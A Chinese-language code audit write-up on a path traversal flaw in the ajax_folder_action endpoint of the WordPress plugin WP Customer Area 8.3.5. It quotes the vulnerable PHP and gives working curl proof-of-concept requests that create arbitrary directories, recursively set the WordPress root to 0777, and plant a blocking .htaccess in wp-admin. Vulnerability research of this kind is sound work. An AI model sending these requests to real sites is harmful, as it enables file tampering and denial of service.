# 一次无所获的代码审计

## 简述

在一次代码审计中发现插件WP Customer Area疑似存在目录穿越漏洞，验证了不少时间，最终确定该接口**确实**存在目录穿越的目录创建、权限修改和 `.htaccess` 文件写入操作，虽然没有比较好利用的读取操作吧但也还行。然而天不遂人愿，当我找到页面的设置位置时，发现这两个位置居然是本来就可以修改的，唉大半天就这么过去咯，姑且把整个流程记下来吧。

TODO：我还是觉得这个插件有任意目录递归chmod的能力很变态，姑且提个漏洞试试，回去搭linux环境。

![PoC 验证结果](image-20260608171811595.png)

## 漏洞描述

WP Customer Area v8.3.5 的 `ajax_folder_action` AJAX 端点中，`$_POST['path']` 参数未经任何路径验证直接传入 `RecursiveDirectoryIterator`、`chmod()`、`mkdir()` 和 `copy()` 函数。UI 层面虽然将该功能限制在插件的存储目录（`wp-content/customer-area/storage/`），但后端 AJAX handler 未校验 `path` 是否属于允许路径，导致授权管理员可对服务器任意路径执行目录创建、权限修改和 `.htaccess` 文件写入操作。

## 漏洞文件

```
src/php/core-addons/admin-area/admin-area-addon.class.php:73-136
```

## 存在缺陷的代码

```php
public function ajax_folder_action() {
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Not allowed');
    }
    if (false === check_ajax_referer('cuar_folder_action')) {
        wp_send_json_error('CSRF Error');
    }

    $action = isset($_POST['folder_action']) ? $_POST['folder_action'] : '';
    $path   = isset($_POST['path']) ? $_POST['path'] : '';       // ← 无校验
    $extra  = isset($_POST['extra']) ? $_POST['extra'] : '';

    switch ($action) {
        case 'chmod':
            $iterator = new RecursiveDirectoryIterator($path);    // ← 任意路径迭代
            foreach ($iterator as $item) {
                chmod($item, octdec($extra));                     // ← 任意路径改权限
            }
            break;
        case 'mkdir':
            @mkdir($path, $extra, true);                          // ← 任意目录创建
            break;
        case 'secure-htaccess':
            $dest_htaccess_path = trailingslashit($path) . '.htaccess';
            @copy($htaccess_template_path, $dest_htaccess_path);  // ← 任意路径写 .htaccess
            break;
    }
    wp_send_json_success();
}
```

## PoC

**前置条件**：管理员身份 + 有效 nonce（从设置页获取）

**nonce 获取**：

```
GET /wp-admin/options-general.php?page=wpca-settings&tab=cuar_private_files
→ HTML 中 <p class="cuar-folder-action" data-nonce="XXXXXXXXXX"> 的 data-nonce
```

**PoC 1: 在任意目录创建文件夹**

```bash
curl -X POST "http://target/wp-admin/admin-ajax.php" \
  -b "wordpress_logged_in_xxx=..." \
  -d "action=cuar_folder_action&folder_action=mkdir&path=C:\pwned&extra=0777&_ajax_nonce=XXXXXXXXXX"
```
→ 响应：`{"success":true}`

**PoC 2: chmod 修改 WordPress 根目录为 0777**

```bash
curl -X POST "http://target/wp-admin/admin-ajax.php" \
  -b "..." \
  -d "action=cuar_folder_action&folder_action=chmod&path=D:\wamp\www\wordpress&extra=0777&_ajax_nonce=XXXXXXXXXX"
```
→ 响应：`{"success":true}`

**PoC 3: 在 wp-admin 写入 Deny from all（DoS）**
```bash
curl -X POST "http://target/wp-admin/admin-ajax.php" \
  -b "..." \
  -d "action=cuar_folder_action&folder_action=secure-htaccess&path=D:\wamp\www\wordpress\wp-admin&extra=&_ajax_nonce=XXXXXXXXXX"
```
→ 响应：`{"success":true}`，wp-admin 返回 500

## 影响

1. **全站权限修改**：chmod 0777 使敏感文件可读（Linux 上有效，windows修改无效）
